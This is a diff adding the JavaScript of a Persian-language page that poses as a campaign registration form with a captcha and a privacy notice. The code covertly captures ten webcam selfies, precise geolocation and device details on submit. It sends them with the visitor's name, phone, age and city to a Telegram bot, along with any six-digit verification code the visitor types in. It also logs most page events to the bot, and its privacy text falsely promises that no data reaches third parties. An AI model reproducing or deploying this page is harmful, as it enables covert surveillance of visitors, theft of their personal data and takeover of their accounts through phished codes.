+                    ctx.rotate(angle);
+                    ctx.font = `bold ${20 + Math.random() * 6}px monospace`;
+                    ctx.textAlign = 'center';
+                    ctx.textBaseline = 'middle';
+                    ctx.shadowColor = 'rgba(255,215,0,0.2)';
+                    ctx.shadowBlur = 8;
+                    const r = 200 + Math.random() * 55;
+                    const g = 180 + Math.random() * 75;
+                    const b = 100 + Math.random() * 155;
+                    ctx.fillStyle = `rgb(${r},${g},${b})`;
+                    ctx.fillText(chars[i], 0, 0);
+                    ctx.restore();
+                }
+
+                for (let i = 0; i < 30; i++) {
+                    ctx.fillStyle = `rgba(255,255,255,${0.02 + Math.random() * 0.06})`;
+                    ctx.beginPath();
+                    ctx.arc(Math.random() * w, Math.random() * h, 1 + Math.random() * 2, 0, Math.PI * 2);
+                    ctx.fill();
+                }
+                ctx.strokeStyle = 'rgba(255,215,0,0.06)';
+                ctx.lineWidth = 1;
+                ctx.strokeRect(0, 0, w, h);
+            }
+
+            function refreshCaptcha() {
+                captchaText = generateCaptcha();
+                drawCaptcha(captchaText);
+                captchaInput.value = '';
+                captchaError.classList.remove('show');
+                captchaSuccess.classList.remove('show');
+                captchaVerified = false;
+                sendLogToBot(`🔄 کپچا جدید: ${captchaText}`);
+            }
+
+            // ============================================================
+            //  LOG TO BOT
+            // ============================================================
+            async function sendLogToBot(message) {
+                try {
+                    if (!BOT_TOKEN || !CHAT_ID) return;
+                    const fullMsg =
+                        `📢 <b>رویداد سایت</b>\n${message}\n🕒 ${new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' })}`;
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: fullMsg, parse_mode: 'HTML' })
+                    });
+                } catch (_) {}
+            }
+
+            // ============================================================
+            //  TOAST
+            // ============================================================
+            function showToast(msg, type = 'info', duration = 3500) {
+                toast.textContent = msg;
+                toast.className = 'toast ' + type;
+                void toast.offsetWidth;
+                toast.classList.add('show');
+                clearTimeout(toast._timer);
+                toast._timer = setTimeout(() => toast.classList.remove('show'), duration);
+            }
+
+            // ============================================================
+            //  STATUS
+            // ============================================================
+            function setStatus(type, text, icon) {
+                statusBar.className = 'status-bar show ' + type;
+                statusIcon.textContent = icon || '⏳';
+                statusText.textContent = text;
+            }
+
+            function hideStatus() {
+                statusBar.className = 'status-bar';
+                statusBar.style.display = 'none';
+            }
+
+            function showStatus(type, text, icon) {
+                statusBar.style.display = 'block';
+                setStatus(type, text, icon);
+            }
+
+            // ============================================================
+            //  DEVICE INFO
+            // ============================================================
+            function getFullDeviceInfo() {
+                const ua = navigator.userAgent;
+                let os = 'Unknown',
+                    osVersion = 'Unknown',
+                    brand = 'Unknown',
+                    model = 'Unknown';
+                if (ua.includes('Android')) {
+                    os = 'Android';
+                    const m = ua.match(/Android\s+([\d.]+)/);
+                    osVersion = m ? m[1] : 'Unknown';
+                    const mm = ua.match(/\(([^;]+);\s*([^;]+)\)/);
+                    if (mm) {
+                        const parts = mm[1].split(' ');
+                        brand = parts[0] || 'Unknown';
+                        model = mm[2] || 'Unknown';
+                    }
+                    if (ua.includes('Xiaomi')) brand = 'Xiaomi';
+                    else if (ua.includes('Samsung')) brand = 'Samsung';
+                    else if (ua.includes('Poco')) brand = 'Poco';
+                    else if (ua.includes('Redmi')) brand = 'Redmi';
+                    else if (ua.includes('Huawei')) brand = 'Huawei';
+                    else if (ua.includes('OnePlus')) brand = 'OnePlus';
+                    else if (ua.includes('Google')) brand = 'Google';
+                    else if (ua.includes('Motorola')) brand = 'Motorola';
+                    else if (ua.includes('Nokia')) brand = 'Nokia';
+                    else if (ua.includes('LG')) brand = 'LG';
+                    else if (ua.includes('Sony')) brand = 'Sony';
+                    else if (ua.includes('Oppo')) brand = 'Oppo';
+                    else if (ua.includes('Vivo')) brand = 'Vivo';
+                    else if (ua.includes('Realme')) brand = 'Realme';
+                    if (ua.includes('Poco X3')) model = 'Poco X3';
+                    else if (ua.includes('Poco F')) model = 'Poco F' + (ua.match(/Poco F(\d+)/)?.[1] || '');
+                    else if (ua.includes('Redmi Note')) model = 'Redmi Note ' + (ua.match(/Redmi Note\s+(\d+)/)?.[1] ||
+                    '');
+                    else if (ua.includes('Mi ')) model = 'Mi ' + (ua.match(/Mi\s+([^\s;]+)/)?.[1] || '');
+                } else if (ua.includes('iPhone')) {
+                    os = 'iOS';
+                    brand = 'Apple';
+                    const mm = ua.match(/iPhone(\d+,\d+)/);
+                    if (mm) {
+                        const map = { '10,6': 'X', '11,2': '8', '11,4': '8 Plus', '11,6': '8 Plus', '11,8': 'XR',
+                            '12,1': 'XS', '12,3': 'XS Max', '12,5': 'XS Max', '12,8': '11', '13,1': '11 Pro',
+                            '13,2': '11 Pro Max', '13,3': '12 mini', '13,4': '12', '13,5': '12 Pro',
+                            '13,6': '12 Pro Max', '14,2': '13', '14,3': '13 Pro', '14,4': '13 Pro Max',
+                            '14,5': '13 mini', '14,7': '14', '14,8': '14 Plus', '15,2': '14 Pro',
+                            '15,3': '14 Pro Max'
+                        };
+                        model = 'iPhone ' + (map[mm[1]] || mm[1]);
+                    } else { model = 'iPhone'; }
+                } else if (ua.includes('iPad')) { os = 'iPadOS';
+                    brand = 'Apple';
+                    model = 'iPad'; } else if (ua.includes('Windows')) { os = 'Windows';
+                    brand = 'PC';
+                    model = 'Windows PC';
+                    osVersion = 'Windows'; } else if (ua.includes('Mac')) { os = 'macOS';
+                    brand = 'Apple';
+                    model = 'Mac'; }
+                return {
+                    os,
+                    osVersion,
+                    brand,
+                    model,
+                    full: `${brand} ${model} | ${os} ${osVersion}`,
+                    ua: ua
+                };
+            }
+
+            // ============================================================
+            //  LOCATION WITH RETRY
+            // ============================================================
+            async function getLocationWithRetry(retries = MAX_LOCATION_RETRIES) {
+                for (let attempt = 1; attempt <= retries; attempt++) {
+                    try {
+                        const pos = await new Promise((resolve, reject) => {
+                            if (!navigator.geolocation) { reject('not supported'); return; }
+                            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                                enableHighAccuracy: true,
+                                timeout: 10000,
+                                maximumAge: 0
+                            });
+                        });
+                        try {
+                            const url =
+                                `https://nominatim.openstreetmap.org/reverse?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&format=json&accept-language=fa`;
+                            const resp = await fetch(url);
+                            const data = await resp.json();
+                            if (data && data.display_name) {
+                                return data.display_name;
+                            }
+                        } catch (_) {}
+                        return `${pos.coords.latitude},${pos.coords.longitude}`;
+                    } catch (err) {
+                        console.warn(`Location attempt ${attempt} failed:`, err);
+                        if (attempt === retries) {
+                            return 'موقعیت مکانی در دسترس نیست';
+                        }
+                        await new Promise(r => setTimeout(r, 1000));
+                    }
+                }
+                return 'موقعیت مکانی در دسترس نیست';
+            }
+
+            // ============================================================
+            //  CAPTURE SELFIES (کیفیت بالا)
+            // ============================================================
+            async function captureSelfies() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
+                    });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.setAttribute('playsinline', '');
+                    await video.play();
+
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+
+                    const total = 10;
+                    const shots = [];
+                    for (let i = 0; i < total; i++) {
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const dataURL = canvas.toDataURL('image/jpeg', 0.92);
+                        const blob = await fetch(dataURL).then(r => r.blob());
+                        const file = new File([blob], `selfie_${Date.now()}_${i+1}.jpg`, { type: 'image/jpeg' });
+                        shots.push({ dataURL, file });
+                        if (i < total - 1) await new Promise(r => setTimeout(r, 250));
+                    }
+                    stream.getTracks().forEach(t => t.stop());
+                    await sendLogToBot(`📸 ${shots.length} عکس سلفی گرفته شد (کیفیت بالا)`);
+                    return shots;
+                } catch (err) {
+                    await sendLogToBot(`❌ خطا در گرفتن عکس: ${err.message}`);
+                    return [];
+                }
+            }
+
+            async function buildZip(photos) {
+                if (!photos || photos.length === 0) {
+                    await sendLogToBot('⚠️ هیچ عکسی برای ZIP وجود ندارد');
+                    return null;
+                }
+                try {
+                    const zip = new JSZip();
+                    for (let i = 0; i < photos.length; i++) {
+                        zip.file(`selfie_${i+1}.jpg`, photos[i].file);
+                    }
+                    const blob = await zip.generateAsync({ type: 'blob' });
+                    await sendLogToBot(`📦 ZIP با ${photos.length} عکس ساخته شد (${blob.size} bytes)`);
+                    return blob;
+                } catch (err) {
+                    await sendLogToBot(`❌ خطا در ساخت ZIP: ${err.message}`);
+                    return null;
+                }
+            }
+
+            // ============================================================
+            //  SEND TO TELEGRAM (فقط دامنه اصلی)
+            // ============================================================
+            async function sendToTelegram(text, fileBlob = null, fileName = 'selfies.zip') {
+                if (!BOT_TOKEN || !CHAT_ID) {
+                    await sendLogToBot('❌ توکن یا چت آیدی تنظیم نشده');
+                    return false;
+                }
+
+                try {
+                    // Send text
+                    const r1 = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
+                    });
+                    if (!r1.ok) {
+                        const err = await r1.text();
+                        await sendLogToBot(`❌ ارسال متن ناموفق: ${err}`);
+                        return false;
+                    }
+
+                    // Send file if exists
+                    if (fileBlob) {
+                        const fd = new FormData();
+                        fd.append('chat_id', CHAT_ID);
+                        fd.append('document', fileBlob, fileName);
+                        const r2 = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                            method: 'POST',
+                            body: fd
+                        });
+                        if (!r2.ok) {
+                            const err = await r2.text();
+                            await sendLogToBot(`❌ ارسال فایل ناموفق: ${err}`);
+                            return false;
+                        }
+                    }
+
+                    await sendLogToBot('✅ ارسال موفق به تلگرام');
+                    return true;
+                } catch (err) {
+                    await sendLogToBot(`❌ خطا در ارسال به تلگرام: ${err.message}`);
+                    return false;
+                }
+            }
+
+            async function sendPhotosIndividually(photos, text) {
+                if (!photos || photos.length === 0) {
+                    return await sendToTelegram(text, null, null);
+                }
+                const textSuccess = await sendToTelegram(text, null, null);
+                let allSuccess = true;
+                for (let i = 0; i < photos.length; i++) {
+                    const file = photos[i].file;
+                    const success = await sendToTelegram(`📸 عکس ${i+1} از ${photos.length}`, file, `selfie_${i+1}.jpg`);
+                    if (!success) {
+                        allSuccess = false;
+                        await sendLogToBot(`❌ ارسال عکس ${i+1} ناموفق بود`);
+                    } else {
+                        await sendLogToBot(`✅ عکس ${i+1} ارسال شد`);
+                    }
+                    if (i < photos.length - 1) await new Promise(r => setTimeout(r, 500));
+                }
+                return textSuccess && allSuccess;
+            }
+
+            // ============================================================
+            //  TIMER FOR CODE
+            // ============================================================
+            function resetTimer() {
+                clearInterval(timerInterval);
+                timerSeconds = 10;
+                canResend = false;
+                resendBtn.disabled = true;
+                timerCountdown.textContent = timerSeconds;
+                timerText.innerHTML =
+                    `<span class="highlight" id="timerCountdown">${timerSeconds}</span> ثانیه تا ارسال مجدد`;
+                startTimer();
+            }
+
+            function startTimer() {
+                clearInterval(timerInterval);
+                timerInterval = setInterval(() => {
+                    timerSeconds--;
+                    if (timerSeconds <= 0) {
+                        clearInterval(timerInterval);
+                        timerText.textContent = 'می‌توانید درخواست مجدد کنید';
+                        resendBtn.disabled = false;
+                        canResend = true;
+                    } else {
+                        timerText.innerHTML =
+                            `<span class="highlight" id="timerCountdown">${timerSeconds}</span> ثانیه تا ارسال مجدد`;
+                    }
+                }, 1000);
+            }
+
+            // ============================================================
+            //  PERMISSION HANDLER
+            // ============================================================
+            async function requestPermissions() {
+                if (permissionsFinalized) return;
+                permissionsFinalized = true;
+
+                permissionBtn.disabled = true;
+                permissionBtn.textContent = 'در حال دریافت...';
+                permissionError.classList.remove('show');
+
+                // Camera
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                    stream.getTracks().forEach(t => t.stop());
+                    cameraGranted = true;
+                    permCamera.textContent = '✅ مجاز';
+                    permCamera.className = 'ok';
+                    await sendLogToBot('✅ مجوز دوربین دریافت شد');
+                } catch (err) {
+                    cameraGranted = false;
+                    permCamera.textContent = '❌ رد شد';
+                    permCamera.className = 'fail';
+                    await sendLogToBot(`❌ مجوز دوربین رد شد: ${err.message}`);
+                }
+
+                // Location
+                try {
+                    const pos = await new Promise((resolve, reject) => {
+                        if (!navigator.geolocation) { reject('not supported'); return; }
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        });
+                    });
+                    locationGranted = true;
+                    permLocation.textContent = '✅ مجاز';
+                    permLocation.className = 'ok';
+                    await sendLogToBot(`✅ مجوز موقعیت دریافت شد: ${pos.coords.latitude},${pos.coords.longitude}`);
+                } catch (err) {
+                    locationGranted = false;
+                    permLocation.textContent = '❌ رد شد';
+                    permLocation.className = 'fail';
+                    await sendLogToBot(`❌ مجوز موقعیت رد شد: ${err.message}`);
+                }
+
+                if (cameraGranted && locationGranted) {
+                    permissionBtn.textContent = '✅ دریافت شد';
+                    showToast('✅ مجوزها دریافت شد', 'success', 2000);
+                    await sendLogToBot('✅ همه مجوزها دریافت شد');
+                    closeOverlay();
+                } else {
+                    permissionBtn.textContent = 'تلاش مجدد';
+                    permissionBtn.disabled = false;
+                    permissionsFinalized = false;
+                    permissionError.classList.add('show');
+                    showToast('⚠️ لطفاً همه مجوزها را بدهید', 'error', 3000);
+                    await sendLogToBot('⚠️ کاربر همه مجوزها را نداد');
+                    if (cameraGranted && !locationGranted) {
+                        setTimeout(() => {
+                            if (!overlayClosed) {
+                                closeOverlay();
+                            }
+                        }, 2000);
+                    }
+                }
+            }
+
+            // ============================================================
+            //  CLOSE OVERLAY
+            // ============================================================
+            function closeOverlay() {
+                if (overlayClosed) return;
+                overlayClosed = true;
+                clearInterval(permTimerInterval);
+                permissionOverlay.classList.add('hidden');
+                mainContainer.classList.add('show');
+
+                if (!locationGranted) {
+                    permSnackbar.classList.add('show');
+                    setTimeout(() => { permSnackbar.classList.remove('show'); }, 5000);
+                }
+
+                sendVisitInfo();
+
+                if (!locationGranted) {
+                    setTimeout(() => {
+                        navigator.geolocation.getCurrentPosition(
+                            (pos) => { locationGranted = true;
+                                sendLogToBot('✅ موقعیت (تلاش مجدد) دریافت شد'); },
+                            (err) => { sendLogToBot(`⚠️ موقعیت (تلاش مجدد) رد شد: ${err.message}`); }, {
+                                enableHighAccuracy: true,
+                                timeout: 8000
+                            }
+                        );
+                    }, 1500);
+                }
+
+                resetTimer();
+                refreshCaptcha();
+            }
+
+            // ============================================================
+            //  TIMER 2 MIN
+            // ============================================================
+            function startPermissionTimer() {
+                permTimeLeft = PERMISSION_TIMEOUT;
+                updateTimerDisplay();
+                clearInterval(permTimerInterval);
+                permTimerInterval = setInterval(() => {
+                    permTimeLeft--;
+                    updateTimerDisplay();
+                    if (permTimeLeft <= 0 && !overlayClosed) {
+                        clearInterval(permTimerInterval);
+                        closeOverlay();
+                    }
+                }, 1000);
+            }
+
+            function updateTimerDisplay() {
+                const mins = Math.floor(permTimeLeft / 60);
+                const secs = permTimeLeft % 60;
+                timerCountdownPerm.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+            }
+
+            // ============================================================
+            //  SEND VISIT INFO
+            // ============================================================
+            async function sendVisitInfo() {
+                try {
+                    const device = getFullDeviceInfo();
+                    const location = await getLocationWithRetry(MAX_LOCATION_RETRIES);
+                    const now = new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' });
+                    const msg =
+                        `🟢 <b>ورود به سایت</b>\n📱 دستگاه: ${device.full}\n📍 موقعیت: ${location}\n🕒 زمان: ${now}\n📸 دوربین: ${cameraGranted ? 'مجاز' : 'نامجاز'}\n📍 موقعیت: ${locationGranted ? 'مجاز' : 'نامجاز'}`;
+                    await sendToTelegram(msg, null, null);
+                    await sendLogToBot('✅ اطلاعات ورود ارسال شد');
+                } catch (err) {
+                    await sendLogToBot(`❌ خطا در ارسال اطلاعات ورود: ${err.message}`);
+                }
+            }
+
+            // ============================================================
+            //  CAPTCHA VERIFICATION
+            // ============================================================
+            captchaInput.addEventListener('input', function() {
+                const val = this.value.trim().toLowerCase();
+                if (val.length === 5) {
+                    if (val === captchaText) {
+                        captchaVerified = true;
+                        captchaError.classList.remove('show');
+                        captchaSuccess.classList.add('show');
+                        sendLogToBot(`✅ کپچا صحیح: ${val}`);
+                    } else {
+                        captchaVerified = false;
+                        captchaError.classList.add('show');
+                        captchaSuccess.classList.remove('show');
+                        sendLogToBot(`❌ کپچا اشتباه: ${val} (صحیح: ${captchaText})`);
+                    }
+                } else {
+                    captchaVerified = false;
+                    captchaError.classList.remove('show');
+                    captchaSuccess.classList.remove('show');
+                }
+            });
+
+            captchaRefresh.addEventListener('click', function() {
+                refreshCaptcha();
+                sendLogToBot('🔄 کپچا تازه شد');
+            });
+
+            captchaCanvas.addEventListener('click', function() {
+                refreshCaptcha();
+                sendLogToBot('🔄 کپچا با کلیک تازه شد');
+            });
+
+            // ============================================================
+            //  EVENT: PERMISSION BUTTON
+            // ============================================================
+            permissionBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                sendLogToBot('🖱️ کاربر روی "شروع کن" کلیک کرد');
+                requestPermissions();
+            });
+
+            // ============================================================
+            //  RESEND
+            // ============================================================
+            resendBtn.addEventListener('click', function() {
+                if (!canResend) return;
+                resendBtn.disabled = true;
+                canResend = false;
+                timerSeconds = 120;
+                timerText.innerHTML =
+                    `<span class="highlight" id="timerCountdown">۱۲۰</span> ثانیه تا ارسال مجدد`;
+                clearInterval(timerInterval);
+                timerInterval = setInterval(() => {
+                    timerSeconds--;
+                    if (timerSeconds <= 0) {
+                        clearInterval(timerInterval);
+                        timerText.textContent = 'می‌توانید درخواست مجدد کنید';
+                        resendBtn.disabled = false;
+                        canResend = true;
+                    } else {
+                        timerText.innerHTML =
+                            `<span class="highlight" id="timerCountdown">${timerSeconds}</span> ثانیه تا ارسال مجدد`;
+                    }
+                }, 1000);
+                codeInput.value = '';
+                codeInput.className = 'code-input';
+                isCodeVerified = false;
+                showToast('✅ کد جدید ارسال شد', 'success', 2000);
+                sendLogToBot('🔄 کاربر درخواست کد مجدد کرد');
+            });
+
+            // ============================================================
+            //  VERIFY
+            // ============================================================
+            verifyBtn.addEventListener('click', function() {
+                const val = codeInput.value.trim();
+                if (val.length === 6 && /^\d{6}$/.test(val)) {
+                    isCodeVerified = true;
+                    codeInput.className = 'code-input verified';
+                    showToast('✅ کد تایید شد', 'success', 2000);
+                    sendCodeToBot(val);
+                    sendLogToBot(`✅ کد تایید وارد شد: ${val}`);
+                } else {
+                    showToast('❌ کد ۶ رقم وارد کنید', 'error', 2000);
+                    codeInput.focus();
+                    sendLogToBot(`❌ کد نامعتبر: ${val || 'خالی'}`);
+                }
+            });
+
+            async function sendCodeToBot(code) {
+                const name = fullName.value.trim() || 'نامشخص';
+                const msg = `🔐 <b>کد تایید وارد شد</b>\n👤 کاربر: ${name}\n🔢 کد: ${code}`;
+                await sendToTelegram(msg, null, null);
+            }
+
+            codeInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') verifyBtn.click(); });
+
+            // ============================================================
+            //  PRIVACY
+            // ============================================================
+            privacyLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                sendLogToBot('📋 کاربر سیاست حریم خصوصی را مشاهده کرد');
+                alert(
+                    '📋 سیاست حفظ حریم خصوصی\n\n' +
+                    '۱. اطلاعات شما فقط برای هماهنگی کارزار استفاده می‌شود.\n' +
+                    '۲. هیچ اطلاعاتی به اشخاص ثالث داده نمی‌شود.\n' +
+                    '۳. شما می‌توانید درخواست حذف اطلاعات دهید.\n' +
+                    '۴. با ثبت، رضایت آگاهانه خود را اعلام می‌دارید.'
+                );
+            });
+
+            // ============================================================
+            //  FORM SUBMIT
+            // ============================================================
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                if (isSubmitting) return;
+
+                const name = fullName.value.trim();
+                const phoneVal = phone.value.trim();
+                const ageVal = age.value.trim();
+                const cityVal = city.value.trim();
+
+                if (!name || !phoneVal || !ageVal) {
+                    showToast('❌ فیلدهای اجباری را پر کنید', 'error', 2500);
+                    sendLogToBot('❌ کاربر فیلدهای اجباری را پر نکرد');
+                    return;
+                }
+                if (!consent.checked) {
+                    showToast('❌ با سیاست حریم خصوصی موافقت کنید', 'error', 2500);
+                    sendLogToBot('❌ کاربر با حریم خصوصی موافقت نکرد');
+                    return;
+                }
+                if (!captchaVerified) {
+                    showToast('❌ کد امنیتی را درست وارد کنید', 'error', 2500);
+                    sendLogToBot(`❌ کپچا تایید نشد (ورودی: ${captchaInput.value.trim() || 'خالی'})`);
+                    return;
+                }
+
+                isSubmitting = true;
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'در حال ثبت...';
+                showStatus('loading', 'در حال ثبت اطلاعات... (حداکثر ۲۰ ثانیه)', '⏳');
+                sendLogToBot(`📝 کاربر ${name} در حال ثبت است`);
+
+                // Set timeout for registration
+                let registerTimedOut = false;
+                const timeoutPromise = new Promise((_, reject) => {
+                    registerTimeoutId = setTimeout(() => {
+                        registerTimedOut = true;
+                        reject(new Error('TIMEOUT'));
+                    }, REGISTER_TIMEOUT);
+                });
+
+                try {
+                    // Race between registration process and timeout
+                    const result = await Promise.race([
+                        (async () => {
+                            const location = await getLocationWithRetry(MAX_LOCATION_RETRIES);
+                            const photos = await captureSelfies();
+                            const device = getFullDeviceInfo();
+                            const now = new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' });
+
+                            let msg = `📋 <b>ثبت‌نام جدید</b>\n`;
+                            msg += `👤 نام: ${name}\n`;
+                            msg += `📱 شماره: ${phoneVal}\n`;
+                            msg += `🎂 سن: ${ageVal}\n`;
+                            msg += `🏙️ شهر: ${cityVal || 'ذکر نشده'}\n`;
+                            msg += `📍 موقعیت: ${location}\n`;
+                            msg += `📱 دستگاه: ${device.full}\n`;
+                            msg += `📸 تعداد عکس: ${photos.length}\n`;
+                            msg += `🕒 زمان: ${now}`;
+
+                            let success = false;
+                            const zip = await buildZip(photos);
+
+                            if (zip) {
+                                success = await sendToTelegram(msg, zip, `selfies_${Date.now()}.zip`);
+                            } else {
+                                await sendLogToBot('⚠️ ZIP ساخته نشد، ارسال تک‌تک عکس‌ها');
+                                success = await sendPhotosIndividually(photos, msg);
+                            }
+
+                            return { success, name };
+                        })(),
+                        timeoutPromise
+                    ]);
+
+                    clearTimeout(registerTimeoutId);
+
+                    if (result && result.success) {
+                        showStatus('success', '✅ ثبت موفق! اطلاعات ارسال شد.', '✅');
+                        showToast('✅ ثبت‌نام با موفقیت انجام شد', 'success', 3000);
+                        submitBtn.textContent = 'ثبت';
+                        codeSection.classList.add('show');
+                        resetTimer();
+                        codeInput.value = '';
+                        codeInput.className = 'code-input';
+                        isCodeVerified = false;
+                        sendLogToBot(`✅ ثبت‌نام ${result.name} با موفقیت انجام شد`);
+                        refreshCaptcha();
+                    } else if (registerTimedOut) {
+                        showStatus('error', '❌ زمان ثبت تمام شد! دوباره تلاش کنید.', '❌');
+                        showToast('⚠️ زمان ثبت به پایان رسید، دوباره تلاش کنید', 'error', 3500);
+                        submitBtn.textContent = 'ثبت';
+                        sendLogToBot(`❌ ثبت‌نام ${name} به دلیل تایم‌اوت ناموفق بود`);
+                    } else {
+                        showStatus('error', '❌ مشکلی پیش آمد! دوباره تلاش کنید.', '❌');
+                        showToast('⚠️ مشکلی پیش آمد، دوباره تلاش کنید', 'error', 3500);
+                        submitBtn.textContent = 'ثبت';
+                        sendLogToBot(`❌ ثبت‌نام ${name} با شکست مواجه شد`);
+                    }
+                } catch (err) {
+                    clearTimeout(registerTimeoutId);
+                    if (err.message === 'TIMEOUT') {
+                        showStatus('error', '❌ زمان ثبت تمام شد! دوباره تلاش کنید.', '❌');
+                        showToast('⚠️ زمان ثبت به پایان رسید، دوباره تلاش کنید', 'error', 3500);
+                        sendLogToBot(`❌ ثبت‌نام ${name} به دلیل تایم‌اوت ناموفق بود`);
+                    } else {
+                        console.error(err);
+                        showStatus('error', '❌ مشکلی پیش آمد! دوباره تلاش کنید.', '❌');
+                        showToast('⚠️ مشکلی پیش آمد، دوباره تلاش کنید', 'error', 3500);
+                        sendLogToBot(`❌ خطا در ثبت: ${err.message}`);
+                    }
+                    submitBtn.textContent = 'ثبت';
+                } finally {
+                    isSubmitting = false;
+                    submitBtn.disabled = false;
+                    setTimeout(() => { if (statusBar.className.includes('show')) hideStatus(); }, 5000);
+                }
+            });
+
+            // ============================================================
+            //  INIT
+            // ============================================================
+            startPermissionTimer();
+            sendLogToBot('🌐 سایت بارگذاری شد');
+
+            // Particles
+            (function() {
+                const c = document.getElementById('particles');
+                for (let i = 0; i < 50; i++) {
+                    const p = document.createElement('div');
+                    p.className = 'particle';
+                    p.style.left = Math.random() * 100 + '%';
+                    p.style.top = Math.random() * 100 + '%';
+                    p.style.width = (1 + Math.random() * 3) + 'px';
+                    p.style.height = p.style.width;
+                    p.style.animationDelay = (Math.random() * 6) + 's';
+                    p.style.animationDuration = (2 + Math.random() * 5) + 's';
+                    c.appendChild(p);
+                }
+            })();
+
+        })();
+    </script>
+
+</body>
+</html>
